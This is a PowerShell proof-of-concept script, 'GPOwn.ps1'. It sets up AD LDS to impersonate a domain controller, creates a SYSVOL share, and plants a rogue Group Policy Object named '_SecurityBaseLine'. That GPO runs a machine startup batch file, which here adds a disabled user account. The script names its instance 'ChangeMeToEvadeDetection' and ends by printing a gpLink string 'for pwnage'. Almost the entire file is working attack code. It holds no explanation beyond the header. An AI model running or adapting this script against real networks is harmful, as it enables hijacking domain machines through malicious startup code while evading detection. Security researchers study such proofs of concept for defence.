<#  
.SYNOPSIS  
    PoC for PGOwn. Script Only works for servers due to use of powershell via the ADWS. can be rewritten to run on workstations   
.DESCRIPTION  
    Installs AD/LDS role, creates instace, configures the instance to act like a DC serving up a GPO.  The GPO is a machine startup script. 
.NOTES  
    File Name  : GPOwn.ps1  
    Author     : Mark R. Gamache  - https://markgamache.blogspot.com/  - @markGamacheNerd  
    Requires   : UNK.  Computers I guess  
    
  

#>

Function Update-LDAPSD
{
    Param (
		
        [parameter(Mandatory = $true)]
		[byte[]]$CurrentSD
		
	)
	
    
    $ads = New-Object System.DirectoryServices.ActiveDirectorySecurity
    $ads.SetSecurityDescriptorBinaryForm($CurrentSD)

    ##auth'd users
    # apply GPO guid edacfd8f-ffb3-11d1-b41d-00a0c968f939
    $AppGuid = [guid]::Parse("edacfd8f-ffb3-11d1-b41d-00a0c968f939")
    $AuthdUsers = New-Object System.Security.Principal.SecurityIdentifier( "S-1-5-11")
    $adCompsAceX =  New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AuthdUsers, "ExtendedRight", "Allow",$AppGuid )

    $ads.AddAccessRule($adCompsAceX)

    $theOutSD =  $ads.GetSecurityDescriptorBinaryForm()

    return $theOutSD

}

Function Set-LDAPObjectBin
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,

		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,

        [parameter(Mandatory = $true)]
		[string]$obDN,

        [parameter(Mandatory = $true)]
        [ValidateSet("Add", "Replace", "Delete")] 
		[string]$Operation,

        [parameter(Mandatory = $true)]
		[string]$AtributeName,

        [parameter(Mandatory = $true)]
		[byte[]]$Value,

		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters
		$LdapConnection = $null
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			#$LdapConnection.AuthType = 'Basic'
            $LdapConnection.AutoBind = $true
            $LdapConnection.Bind()

            #LDAP_SERVER_SD_FLAGS_OID for LDAP control  . needed to update ntSecurityDescriptor  https://msdn.microsoft.com/en-us/library/windows/desktop/aa366987(v=vs.85).aspx
            $OIDVal = [byte[]] @( 0x30, 0x03, 0x02, 0x01, 0x04 )
            $editSDOid = New-Object System.DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $OIDVal, $false, $true)



            #  make a req that we will tweak.
			$rq = new-object System.DirectoryServices.Protocols.ModifyRequest($obDN, $Operation, $atributeName, $Value)
            $rq.Controls.Add($editSDOid)
                        

            $rsp = $LdapConnection.SendRequest($rq)

			
            $LdapConnection.Dispose()


            return $true

		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}


Function Set-LDAPObject
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,

		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,

        [parameter(Mandatory = $true)]
		[string]$obDN,

        [parameter(Mandatory = $true)]
        [ValidateSet("Add", "Replace", "Delete")] 
		[string]$Operation,

        [parameter(Mandatory = $true)]
		[string]$AtributeName,

        [parameter(Mandatory = $true)]
		[string[]]$Value,

		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters
		$LdapConnection = $null
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			#$LdapConnection.AuthType = 'Basic'
            $LdapConnection.AutoBind = $true
            $LdapConnection.Bind()

            #  
			$rq = new-object System.DirectoryServices.Protocols.ModifyRequest($obDN, $Operation, $atributeName, $Value)

            $rsp = $LdapConnection.SendRequest($rq)

			
            $LdapConnection.Dispose()


            return $true

		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}

Function New-LDAPObject
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,

		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,

        [parameter(Mandatory = $true)]
		[string]$obDN,

        [parameter(Mandatory = $true)]
		[string]$objectClass

<#

        [parameter(Mandatory = $true)]
		[string]$atributeName,

        [parameter(Mandatory = $true)]
		[string[]]$Value,

		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters

		$LdapConnection = $null #>
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			#$LdapConnection.AuthType = 'Basic'
            $LdapConnection.AutoBind = $true
            $LdapConnection.Bind()

            # only works of the class has no mandatory attribs, other than the RDN
			$rq = new-object System.DirectoryServices.Protocols.AddRequest($obDN, $objectClass)

            $rsp = $LdapConnection.SendRequest($rq)

			
            $LdapConnection.Dispose()


            return $rq.DistinguishedName

		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}



Function Get-LDAPObject
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,
        
        [parameter(Mandatory = $true)]
		[string]$SearchBase,

        [parameter(Mandatory = $true)]
		[string]$LDAPFilter,

        [parameter(Mandatory = $false)]
		[string[]]$Attributes = $null,

        [parameter(Mandatory = $false)]
        [ValidateSet("Base", "OneLevel", "Subtree")] 
		[string[]]$Scope = "OneLevel",


		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,
		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters
		$LdapConnection
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			#$LdapConnection.AuthType = 'Basic'
									
			#$propDef = @{ "configurationNamingContext" = @(); "schemaNamingContext" = @(); "namingContexts" = @() }
            $theEntries = @{}
            if($Attributes -ne $null)
            {
                $propDef = [string[]] $Attributes
            }


			#build request
			$rq = new-object System.DirectoryServices.Protocols.SearchRequest

            #LDAP_SERVER_SD_FLAGS_OID for LDAP control  . needed to read ntSecurityDescriptor  https://msdn.microsoft.com/en-us/library/windows/desktop/aa366987(v=vs.85).aspx
            $OIDVal = [byte[]] @( 0x30, 0x03, 0x02, 0x01, 0x04 )
            $editSDOid = New-Object System.DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $OIDVal, $false, $true)
            $rq.Controls.Add($editSDOid) | Out-Null

			$rq.DistinguishedName = $SearchBase
			$rq.Filter = $LDAPFilter
			$rq.Scope = $Scope
            if($Attributes -ne $null)
            {
			    $rq.Attributes.AddRange($Attributes) | Out-Null
            }
			
            $rq.TimeLimit = New-Object System.TimeSpan(1,0,4);
			$rsp = $LdapConnection.SendRequest($rq)
    
            foreach($ent in $rsp.Entries)
            {
                $theAttribs = @{}
                $totalAtts = 0
                $totalAtts = $ent.Attributes.Count
                $atKeys = $null
                $atKeys = $ent.Attributes.Keys

                foreach($atttt in $atKeys)
                {
                    try
                    {
                        
                        $attType = $ent.Attributes[$atttt][0].GetType()
                        if($attType.Name -eq "String")
                        {
                            $eeeeeeee = $ent.Attributes[$atttt].GetValues([string])
                            $theAttribs.Add($atttt, $eeeeeeee)
                            if($atttt -eq "url")
                            {
                                echo " "
                            }
                        }
                        else
                        {
                            $eeeeeeee = $ent.Attributes[$atttt].GetValues([byte[]])
                            $theAttribs.Add($atttt, $eeeeeeee)
                        }
                    }
                    catch
                    {
                        Write-Error $Error[0]
                    }
                }
                $theEntries.Add($ent.distinguishedName, $theAttribs)
                $eee = $ent
            }


            return $theEntries



		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}



Function Get-RootDSE
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,
		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,
		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters
		$LdapConnection
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			$LdapConnection.AuthType = 'Basic'
									
			$propDef = @{ "configurationNamingContext" = @(); "schemaNamingContext" = @(); "namingContexts" = @() }

			#build request
			$rq = new-object System.DirectoryServices.Protocols.SearchRequest
			$rq.DistinguishedName = $null
			$rq.Filter = "objectclass=*"
			$rq.Scope = "Base"
			$rq.Attributes.AddRange($propDef.Keys) | Out-Null
			$rq.TimeLimit = New-Object System.TimeSpan(0,0,4);
			$rsp = $LdapConnection.SendRequest($rq)
			$data = new-object PSObject -Property $propDef
			$data.configurationNamingContext = (($rsp.Entries[0].Attributes["configurationNamingContext"].GetValues([string]))[0]) #.Split(';')[1];
			$data.schemaNamingContext = (($rsp.Entries[0].Attributes["schemaNamingContext"].GetValues([string]))[0]) #.Split(';')[1];
			$data.namingContexts  = ($rsp.Entries[0].Attributes["namingContexts"].GetValues([string])) #.Split(';')[2];
			$LdapConnection.Dispose()
			return $data


		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}


function install 
{
	
	Begin
	{	
	if($operation -eq "UniqueInstall") 
		{ 	$NewApplicationPartitionToCreate = $Partition } 
	elseif($operation -eq "ReplicaInstall")
		{ 
		# replica
			$ApplicationPartitionsToReplicate = $Partition 
			
			$nfFound = $false

			#check if the source LDAP is up and holds the naming context we want
			$NCList = Get-RootDSE -LdapServer $SourceServer -Port $SourceLDAPPort
			if($NCList -eq $false)
			{
				#could not connect and should see error in the get-rootdces func
				$false
				exit
			}
			foreach($nc in $NCList.namingContexts)
			{
				if(!($Partition))
				{
					$nfFound = $True
					break
				}

				if($Partition.ToLower() -eq $nc.ToLower())
				{
					#Write-Information "Source good"
					$nfFound = $True
					break
				}
			}


			if($nfFound  )
			{
				#source good
				#Write-Error "`r`nSource good"
			}
			else
			{
				Write-Error "`r`nYour replica source, $SourceServer : $SourceLDAPPort is is up but does not contain the partition $Partition "

				 $false
				exit
			}
		}
	
	#validate the admin user or group exists
		if($Administrator)
		{
			if($Administrator -like "*@*")
			{
				$parts = $Administrator.Split("@")
				$prin = $parts[0]
				$domain = $parts[1]
		
			}
			elseif ($Administrator -like "*\*")
			{
				$parts = $Administrator.Split("\\")
				$prin = $parts[1]
				$domain = $parts[0]
		
			}
			else
			{
				#local domain 
				$domain = $Env:USERDNSDOMAIN
				$prin = $Administrator
			}

			if(verifyPrincipal -userOrGroup $prin -theDomain $domain)
			{
				#echo woo1
			}
		}
		
	
	

	#verify the service account name	
	if($ServiceAccount)
	{
		if(!($ServicePassword))
		{
			Write-Error "`r`nYou entered a service account but no password.`r`nGood day!"
			 $false
			exit
		}
		if ($ServiceAccount -like "*\*")
			{
				$partsSvc = $ServiceAccount.Split("\\")
				$svcprin = $partsSvc[1]
				$svcdomain = $partsSvc[0]
				if(verifyPrincipal -userOrGroup $svcprin -theDomain $svcdomain)
				{
					#Write-Error "`r`nService account exists"
				}
		
			}
			else
			{
				Write-Error "`r`nService account must be in domain\user format.  You entered $ServiceAccount.`r`nGood day!! "
				 $false
				exit
			}
	}
	else
	{
		Write-Host "No service account used. Running as network service" 
	}
	

	
	if(-not $LocalLDAPPortToListenOn -and -not($LocalSSLPortToListenOn))
	{
		$LocalLDAPPortToListenOn = "5389"
		$LocalSSLPortToListenOn = "5636" 
		
	}
	
}

	Process
	{
	# fun times
	[string] $theText = [string]::Empty
	if($operation -eq "UniqueInstall")
	{
		$instTy = "Unique"
	}
	else
	{
		$instTy = "Replica"
	}
	
	$theText+= "[ADAMInstall]`r`nInstallType=$instTy`r`n"
	$theText+= "AddPermissionsToServiceAccount=Yes`r`n"
	$theText+= "InstanceName=$InstanceName`r`n"
	$theText+= "LocalLDAPPortToListenOn=$LocalLDAPPortToListenOn`r`n"
	$theText+= "LocalSSLPortToListenOn=$LocalSSLPortToListenOn`r`n"
	if($Administrator)
	{
		$theText+= "Administrator=`"$Administrator`"`r`n"
	}
	
	
	if( $DataFilesPath -and $LogFilesPath)
	{
		$theText+= "DataFilesPath=$DataFilesPath`r`n"
		$theText+= "LogFilesPath=$LogFilesPath`r`n"
	}
	
	if($operation -eq "ReplicaInstall")
	{
		if($Partition)
		{
			$theText+= "ApplicationPartitionsToReplicate=`"$Partition`"`r`n"
		}
		
		$theText+= "SourceServer=$SourceServer`r`n"
		$theText+= "SourceLDAPPort=$SourceLDAPPort`r`n"
		$theText+= "SourceUserName=$SourceUserName`r`n"
		$theText+= "SourcePassword=$SourcePassword`r`n"
        
        
	}
	else
	{
		if($Partition)
		{
			$theText+= "NewApplicationPartitionToCreate=`"$Partition`"`r`n"
		}
	}
	
	#add service account
	if($ServiceAccount)
	{
		$theText+= "ServiceAccount=$ServiceAccount`r`n"
		$theText+= "ServicePassword=$ServicePassword`r`n" 
	}
	
	#add ldifs
	if($ImportLDIFFiles)
		{
			#ImportLDIFFiles="ms-inetorgperson.ldf" "ms-user.ldf"
			[string[]] $schemFiles = $ImportLDIFFiles.Split(',').Trim()
			[string] $schemLine 
			foreach($line in $schemFiles)
			{
				$schemLine += "`"$line`" "
			}
			$theText+= "ImportLDIFFiles= $schemLine`r`n"
		}
	
	#$theText	
	#%systemroot%\ADAM\adaminstall.exe /answer:drive:\<pathname>\<filename>.txt"
	$filepath = "$env:SystemRoot\ADAM\spFun.txt"
	try
	{
		$theText > $filepath
	}
	catch
	{
		Write-Error $Error[0]
		return $false

	}


}#process

	End
	{
		#install!
		
		try
		{
			$theArgs = @("/answer:$env:SystemRoot\ADAM\spFun.txt")
		#	$doIt = Invoke-Expression   "$env:SystemRoot\ADAM\adaminstall.exe"  -ArgumentList $theArgs -PassThru -Wait
			$doIt = Invoke-Expression   "$env:SystemRoot\ADAM\adaminstall.exe /answer:$filepath"
		#	$doIt = Invoke-Command -FilePath   "$env:SystemRoot\ADAM\adaminstall.exe"  -ArgumentList $theArgs 
		 

			if($doIt.length -gt 2)
			{
				$rrrrr = $doIt[$doIt.length -1]
				if($rrrrr -eq "You have successfully completed the Active Directory Lightweight Directory Services Setup Wizard.")
				{
					$delOut = Invoke-Expression   "sdelete $filepath"
					$fileSufix = [guid]::NewGuid().ToString()
					$resFileName =  "$env:SystemRoot\ADAM\installResult" + $fileSufix + ".txt"
					$doIt | Out-File -FilePath $resFileName -ErrorAction Stop
					#$doIt > $resFileName
					return $True
				}
				else
				{
					$rese =	Get-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ADAM_Installer_Results" -name ADAMInstallErrorMessage
					$catfood= $rese.ADAMInstallErrorMessage
					Write-Error "`r`nFailed to install ADAM instance due to $catfood"
				
					return $false
				}
			}

		


		}
		catch
		{
			$fail = $Error[0]
			return $false
			
		}
	}
}

function listInstances
{
	
	[string[]]$thems = (gci -Path HKLM:\SYSTEM\CurrentControlSet\Services\DirectoryServices).PSchildname
	if($thems.Contains("Linkage"))
	{
		#Just a place holder
	}
	else
	{
		return $false
	}
	$instNames = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\DirectoryServices\Linkage -Name Export).Export
	
	[pscustomobject[]]$ints = @()
	#[int]$idx = 0
	foreach($inst in $instNames)
	{
		$stat = (Get-Service $inst).Status
		$funName =  (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst).DisplayName
		$ldapPort = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst\Parameters)."Port LDAP"
		$SSLPort = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst\Parameters)."Port SSL"
		$oneInst = [pscustomobject] @{Name=$funName; Status=$stat; LDAPPort=$ldapPort; SSLPort=$SSLPort}
		#$ints[$idx] = $oneInst
		$ints += ($oneInst)
	}

	#get data about them
	Write-Debug ""
	return $ints

}


function validateInstallSettings
{
	#we do stuff
	[bool]$valid = $True

		#valdate listenint prots
	if($LocalLDAPPortToListenOn -and -not($LocalSSLPortToListenOn))
	{
		Write-Error "`r`nIf you specify -LocalLDAPPortToListenOn , you must specify -LocalSSLPortToListenOn and vice versa "
		 $false
		exit
	}
	
	if($LocalSSLPortToListenOn -and -not($LocalLDAPPortToListenOn))
	{
		Write-Error "`r`nIf you specify -LocalLDAPPortToListenOn , you must specify -LocalSSLPortToListenOn and vice versa "
		
		 $false
		exit
	}
	


	if(!( $InstanceName))
	{
		Write-Error "`r`nAn install needs an InstanceName "
		return $false
		
	}

	return $valid
}




#begin script
$InstanceName = "ChangeMeToEvadeDetection"
$bLDSInstalled = $false
$operation = "UniqueInstall"
$features = $null

$domainDNS = ""

$features = $null

try
{
    $features = Get-WindowsFeature 
}
catch
{
    # will try desktop below
}


if($features -eq $null)
{
    #this is a desktop OS.
    $features = Get-WindowsOptionalFeature -Online -FeatureName DirectoryServices-ADAM-Client
    if($features.State -eq "Disabled")
    {
        Enable-WindowsOptionalFeature -FeatureName DirectoryServices-ADAM-Client -Online
        $features = Get-WindowsOptionalFeature -Online -FeatureName DirectoryServices-ADAM-Client
        if($features.State -eq "Enabled")
        {
            $bLDSInstalled = $true
        }

    }
    else
    {
        $bLDSInstalled = $true
    }
    

}
else
{
    #look for ADLDS. This is a server OS
    $adlds =  $features | ? {$_.Name -eq "ADLDS"}
    if($adlds.Installed -eq $true)
    {
        $bLDSInstalled = $true
    }
    else
    {
        $inst = Install-WindowsFeature ADLDS
        if($inst.Success -eq $true)
        {
            $bLDSInstalled = $true
        }
    }

}

if($bLDSInstalled)
{
    ##move on
    Write-Host "AD/LDS is installed"
}
else
{
    #fail 
    Write-Warning "Can't get ADLDS Role installed"
    return
}


$fqdn = (Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain
$dnsParts = $fqdn.Split(".")
$newDN = ""
$bSkipOne = $true
foreach($P in $dnsParts)
{
    $newDN = $newDN + "DC=$P,"
    if($bSkipOne)
    {
        $bSkipOne = $false
    }
    else
    {
        $domainDNS =  $domainDNS + $P + "."
    }
}

$newDN = $newDN.Substring(0, $newDN.Length -1)

$domainDNS = $domainDNS.Substring(0, $domainDNS.Length -1)

[string]$Partition = $newDN

[string]$LocalLDAPPortToListenOn = "389"

[string]$LocalSSLPortToListenOn = "636"
 
[string]$ImportLDIFFiles = "MS-adamschemaw2k8.LDF"

$bPartSuccess = $false

if(validateInstallSettings)
{

    $currentInstances = listInstances

    if($currentInstances -eq $false)
    {
        #settings look right, lets install
	    $happy = install

        if($happy)
	    {
		    $bPartSuccess = $True
	    }
	    else
	    {
		    $bPartSuccess = $false
	    }
    }
    else
    {

        if( $currentInstances.Name.Contains("ChangeMeToEvadeDetection"))
        {
            Write-Host "LDS instance already in place"
            $happy = $True
        }
        else
        {
            #settings look right, lets install
	        $happy = install
	    }

        if($happy)
	    {
		    $bPartSuccess = $True
	    }
	    else
	    {
		    $bPartSuccess = $false
	    }

    }
}
else
{
	$bPartSuccess = $false
}


if($bPartSuccess)
{

    # add authd users to LDS readers role  S-1-5-11
    $readersDN = "CN=Readers,CN=Roles,"+ $Partition
    $DomCom = "<SID=$((Get-ADGroup "domain computers").SID)>"
    $DomUse = "<SID=$((Get-ADGroup "domain users").SID)>"
    $DConts = "<SID=$((Get-ADGroup "domain Controllers").SID)>"


    $SIDS = @()
    $SIDS += $DomCom 
    $SIDS += $DomUse
    $SIDS += $DConts

    #make sure the folks can read the GPOwns
    #Set-ADObject -Server localhost -Identity $readersDN -Add @{member=$SIDS}
    Set-LDAPObject -LdapServer localhost -obDN $readersDN -AtributeName member -Value $SIDS -Operation Add
 
    #SDDL for def securty on GPC objects
    #findSchma and gpC class
    $theRootDSE = $null
    $theRootDSE = Get-RootDSE -LdapServer localhost 

    #$sys =  New-ADObject -Server localhost -Path "$newDN" -Name System -Type container -PassThru
    $sys = New-LDAPObject -LdapServer localhost -obDN "CN=System,$($newDN)" -objectClass container
    
    if($sys -eq $false)
    {
        $sys = "CN=System,$($newDN)"
    }
    
    #$pol = New-ADObject -Server localhost -Path "$sys" -Name Policies -Type container -PassThru
    $pol = New-LDAPObject -LdapServer localhost -obDN "CN=Policies,$($sys)" -objectClass container

    if($pol -eq $false)
    {
        $pol = "CN=Policies,$($sys)"
    }


    $newGUID = "{" + ([guid]::NewGuid()).ToString() + "}"

    md c:\sysvol
    New-SmbShare -Name "SysVol" -Path "C:\sysvol" 

    md c:\Sysvol\$domainDNS

    md c:\Sysvol\$domainDNS\Policies
    md "c:\Sysvol\$domainDNS\Policies\$newGUID"

    md "c:\Sysvol\$domainDNS\Policies\$newGUID\User"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Startup"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Shutdown"


    $gpt = @'
[General]
Version=2
displayName=New Group Policy Object

'@
    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\GPT.INI" -Value $gpt

    
    $spts = @'

[Startup]
0CmdLine=fun.bat
0Parameters=

'@

    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\scripts.ini" -Value $spts

    $su = @'
rem sample attack here
net user pwntest03 /add /active:no

'@
    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Startup\fun.bat" -Value $su

    #create teh GPO object

    $gptPath = "\\$fqdn\SysVol\$domainDNS\Policies\$newGUID"


    #$thePol = New-ADObject -Server localhost -Path "$($pol.DistinguishedName)" -PassThru -Type groupPolicyContainer -Name "$newGUID" -OtherAttributes @{displayName="_SecurityBaseLine";flags="0";gPCFileSysPath= $gptPath;gPCFunctionalityVersion=2;versionNumber="2";gPCMachineExtensionNames="[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"}
    
    $thePol = New-LDAPObject -LdapServer localhost -obDN "CN=$($newGUID),$($pol)" -objectClass groupPolicyContainer 
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName displayName -Value _SecurityBaseLine 
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName flags -Value "0"
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName gPCFileSysPath -Value $gptPath
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName gPCFunctionalityVersion -Value "2"
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName versionNumber -Value "2"
    $ww = Set-LDAPObject -LdapServer localhost -obDN $thePol -Operation Add -AtributeName gPCMachineExtensionNames -Value "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"

    #make sure the ACL is good.  Need apply GPO guid edacfd8f-ffb3-11d1-b41d-00a0c968f939

    $preA = Get-LDAPObject -LdapServer localhost -SearchBase $thePol -LDAPFilter "objectClass=*" -Attributes ntSecurityDescriptor -Scope Base
    $preB = $preA[$preA.Keys[0]].ntSecurityDescriptor

    $newSD =  Update-LDAPSD -CurrentSD $preB

    $sss = Set-LDAPObjectBin -LdapServer localhost -obDN $thePol -Operation Replace -AtributeName ntSecurityDescriptor -Value $newSD 

    #New-ADObject -Server localhost -Path "$($thePol.DistinguishedName)" -Name User -Type container -PassThru
    $ww = New-LDAPObject -LdapServer localhost -obDN "CN=User,$($thePol)" -objectClass container 
    #New-ADObject -Server localhost -Path "$($thePol.DistinguishedName)" -Name Machine -Type container -PassThru
    $ww = New-LDAPObject -LdapServer localhost -obDN "CN=Machine,$($thePol)" -objectClass container 

    echo "Add this entry to a gpLink, for pwnage`r`n [LDAP://$($thePol);0]"

}

